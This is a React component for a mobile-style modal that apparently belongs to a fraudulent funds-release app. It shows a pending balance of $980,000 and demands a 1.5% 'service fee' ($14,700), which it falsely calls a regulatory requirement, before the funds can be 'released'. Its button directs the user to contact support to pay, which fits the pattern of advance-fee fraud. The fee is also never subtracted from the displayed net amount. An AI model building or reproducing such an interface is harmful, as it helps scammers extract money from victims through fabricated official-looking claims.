import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, AlertTriangle, Info } from 'lucide-react';

const AccessDisclaimer = ({ isOpen, onClose }) => {
  const [acknowledged, setAcknowledged] = useState(false);

  const FEE_PERCENTAGE = 1.5;
  const TOTAL_FUNDS = 980000.00;   // updated
  const FEE_AMOUNT = (TOTAL_FUNDS * FEE_PERCENTAGE) / 100; // 14,700

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
        className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[110] flex items-end sm:items-center justify-center p-0 sm:p-4"
      >
        <motion.div
          initial={{ y: '100%', opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          exit={{ y: '100%', opacity: 0 }}
          transition={{ type: 'spring', damping: 25, stiffness: 300 }}
          onClick={(e) => e.stopPropagation()}
          className="bg-white w-full sm:max-w-md rounded-t-3xl sm:rounded-3xl shadow-2xl max-h-[94vh] overflow-y-auto hide-scrollbar"
        >
          <div className="sticky top-0 bg-white z-10 px-5 pt-4 pb-3 border-b border-gray-100 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="p-1.5 bg-amber-100 rounded-full">
                <AlertTriangle size={16} className="text-amber-600" />
              </div>
              <h2 className="text-base font-bold text-gray-800">Important Notice</h2>
            </div>
            <button onClick={onClose} className="p-1.5 rounded-full hover:bg-gray-100 transition">
              <X size={20} className="text-gray-500" />
            </button>
          </div>

          <div className="px-5 pt-4">
            <div className="bg-amber-50 border border-amber-200 rounded-2xl p-4">
              <div className="flex items-start gap-3">
                <AlertTriangle size={20} className="text-amber-600 flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-sm font-semibold text-amber-900">Access Fee Required</p>
                  <p className="text-xs text-amber-700 mt-1 leading-relaxed">
                    Before the funds of <strong>${TOTAL_FUNDS.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> can be
                    released to your available balance, a one-time service fee of
                    <strong> {FEE_PERCENTAGE}%</strong> must be settled. This is a regulatory requirement.
                  </p>
                </div>
              </div>
            </div>
          </div>

          <div className="px-5 pt-4">
            <div className="bg-gray-50 rounded-2xl p-4 space-y-3">
              <div className="flex justify-between items-center">
                <span className="text-xs text-gray-500">Pending Funds</span>
                <span className="text-sm font-semibold text-gray-800">
                  ${TOTAL_FUNDS.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-xs text-gray-500">Service Fee ({FEE_PERCENTAGE}%)</span>
                <span className="text-sm font-semibold text-red-600">
                  ${FEE_AMOUNT.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </span>
              </div>
              <div className="border-t border-gray-200 pt-3 flex justify-between items-center">
                <span className="text-xs font-medium text-gray-700">Net Amount to be Released</span>
                <span className="text-sm font-bold text-green-600">
                  ${TOTAL_FUNDS.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </span>
              </div>
            </div>
          </div>

          <div className="px-5 pt-4">
            <div className="bg-blue-50 border border-blue-200 rounded-2xl p-4 flex items-start gap-3">
              <Info size={18} className="text-blue-600 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-blue-800 leading-relaxed">
                Once the service fee is settled, our compliance team will review and release
                your funds within 24 business hours. You will receive a confirmation
                notification once the funds are available.
              </p>
            </div>
          </div>

          <div className="px-5 pt-4">
            <label className="flex items-start gap-3 cursor-pointer">
              <input
                type="checkbox"
                checked={acknowledged}
                onChange={(e) => setAcknowledged(e.target.checked)}
                className="mt-0.5 w-4 h-4 accent-navy"
              />
              <span className="text-xs text-gray-600 leading-relaxed">
                I understand that the funds will only be released after the service fee
                of <strong>${FEE_AMOUNT.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong> has been received and confirmed.
              </span>
            </label>
          </div>

          <div className="px-5 pt-4 pb-6 flex gap-3">
            <button onClick={onClose} className="flex-1 py-3 bg-gray-100 text-gray-700 rounded-xl font-medium text-sm hover:bg-gray-200 transition">
              Cancel
            </button>
            <button
              disabled={!acknowledged}
              onClick={() => {
                alert('Please contact support to complete the service fee payment.');
                onClose();
              }}
              className="flex-1 py-3 bg-navy text-white rounded-xl font-medium text-sm hover:bg-navy/90 transition disabled:opacity-40 disabled:cursor-not-allowed"
            >
              Proceed
            </button>
          </div>

          <div className="px-5 pb-5">
            <p className="text-center text-[10px] text-gray-400 leading-relaxed">
              This notice is provided for compliance and transparency.
            </p>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};

export default AccessDisclaimer;